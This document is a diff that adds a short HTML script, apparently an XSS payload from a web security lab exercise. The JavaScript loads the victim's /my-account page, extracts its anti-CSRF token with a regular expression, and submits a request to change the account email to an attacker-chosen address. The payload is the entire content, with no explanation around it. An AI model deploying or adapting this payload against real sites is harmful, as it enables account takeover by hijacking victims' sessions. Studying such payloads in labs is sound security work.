@@ -1,0 +1,13 @@
+<script>
+	var req = new XMLHttpRequest();
+	req.onload = change_email;
+	req.open("GET","/my-account", true);
+	req.send();
+
+	function change_email(){
+		var csrf_token=this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+		var newreq = new XMLHttpRequest();
+		newreq.open("POST","/my-account/change-email", true)
+		newreq.send('email=ddd@ddd.com&csrf='+csrf_token);
+	};
+</script>
